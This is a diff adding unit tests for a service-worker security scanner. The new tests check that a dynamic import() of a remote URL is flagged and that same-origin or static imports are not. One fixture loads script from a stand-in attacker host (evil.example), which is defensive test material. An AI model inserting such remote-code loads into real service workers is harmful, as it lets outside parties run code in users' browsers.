@@ -37,6 +37,19 @@ describe('findSwSecurityIssues', () => {
     expect(issues[0]).toMatch(/external importScripts/);
   });
 
+  it('flags a dynamic import() of a remote URL', () => {
+    // A module worker can `import()` too, and that loads remote code exactly
+    // as `importScripts` does — the same invariant, so the same gate.
+    const issues = findSwSecurityIssues('sw.js', "import('https://evil.example/x.js');");
+    expect(issues).toHaveLength(1);
+    expect(issues[0]).toMatch(/dynamic import/);
+  });
+
+  it('does not flag a same-origin dynamic import or a static one', () => {
+    expect(findSwSecurityIssues('sw.js', "import('./chunk.js');")).toEqual([]);
+    expect(findSwSecurityIssues('sw.js', "import { x } from './y.js';")).toEqual([]);
+  });
+
   it('flags eval()', () => {
     expect(findSwSecurityIssues('sw.js', 'const x = eval("1+1");')).toHaveLength(1);
   });
